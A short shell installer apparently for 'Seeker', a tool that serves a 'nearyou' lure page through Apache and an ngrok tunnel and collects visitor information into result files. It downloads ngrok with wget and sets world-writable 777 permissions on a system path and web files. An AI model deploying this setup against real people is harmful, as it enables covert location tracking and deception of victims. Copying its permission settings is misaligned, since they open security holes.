echo '[!] Updating...'
echo
apt-get update
echo
echo '[!] Installing Apache2 Server...'
echo
apt-get install apache2
echo
echo '[!] Downloading Latest Version of Ngrok...'
echo
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
mkdir Ngrok
cp ngrok Ngrok/
echo
echo '[!] Copying Template to /var/www/html/'
cp -r template/nearyou/ /var/www/html/
echo
echo '[!] Creating seeker symlink...'
ln -s $HOME/tools/seeker/seeker.py /usr/local/bin/seeker
chmod 777 /usr/local/bin/seeker
echo
echo '[!] Setting Permissions...'
chmod 777 /var/www/html/nearyou/php/info.txt
chmod 777 /var/www/html/nearyou/php/result.txt
echo
echo '[!] Installed...Launch Seeker by Typing Seeker in Terminal...'
